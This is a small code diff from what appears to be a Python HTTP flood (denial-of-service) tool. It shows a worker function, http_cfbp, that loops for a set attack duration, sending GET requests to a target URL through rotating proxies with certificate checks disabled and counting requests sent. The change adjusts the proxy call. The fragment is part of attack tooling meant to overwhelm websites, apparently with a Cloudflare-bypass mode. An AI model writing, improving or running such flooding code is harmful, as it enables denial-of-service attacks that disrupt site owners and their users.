@@ -291,7 +291,7 @@ def http_cfbp(worker_id, session, target_url, attack_duration, useragent=None, r
     stoptime = time.time() + attack_duration
     while time.time() < stoptime and Core.attackrunning:
         try:
-            session.get(target_url, headers=headers, timeout=(7,5), verify=False, allow_redirects=False, stream=False, proxies=giveproxy())
+            session.get(target_url, headers=headers, timeout=(7,5), verify=False, allow_redirects=False, stream=False, proxies=giveproxy(True))
 
             Core.infodict[worker_id]['req_sent'] += 1
         except Exception:
